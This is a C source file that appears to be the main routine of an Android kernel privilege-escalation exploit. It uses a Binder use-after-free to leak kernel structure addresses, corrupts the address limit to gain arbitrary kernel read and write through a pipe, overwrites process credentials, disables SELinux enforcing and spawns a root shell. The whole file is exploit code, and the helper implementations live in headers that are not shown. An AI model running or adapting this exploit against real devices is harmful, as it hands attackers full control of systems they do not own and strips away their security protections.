#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>

#include "../include/binder.h"
#include "../include/binder_uaf.h"
#include "../include/corrupt_address_limit.h"
#include "../include/cpu_affinity.h"
#include "../include/kernel_rw.h"
#include "../include/privilege_escalation.h"

int main() {
  int pipefd[2] = {0};
  struct task_struct *leak_task_struct = NULL;
  void *leak_pid_address = NULL;
  void *leak_cred_address = NULL;
  void *leak_nsproxy_address = NULL;
  void *mapped_memory = NULL;

  pin_cpu(0);

  int binder_fd1 = open_binder(BINDER_DEVICE);

  binder_uaf_leak_task_struct(binder_fd1, &leak_task_struct, &leak_pid_address,
                              &leak_cred_address, &leak_nsproxy_address,
                              &mapped_memory);
  corrupt_address_limit(binder_fd1, &leak_task_struct, &mapped_memory);

  init_kernel_read_write_pipe(pipefd);

  verify_arbitrary_read_write(pipefd, leak_task_struct, leak_pid_address);

  patch_cred(pipefd, leak_task_struct, leak_cred_address);
  disable_selinux_enforcing(pipefd, leak_nsproxy_address);
  verify_root();

  if (mapped_memory)
    munmap(mapped_memory, 4096);

  close(binder_fd1);
  close(pipefd[0]);
  close(pipefd[1]);

  spawn_root_shell();

  return 0;
}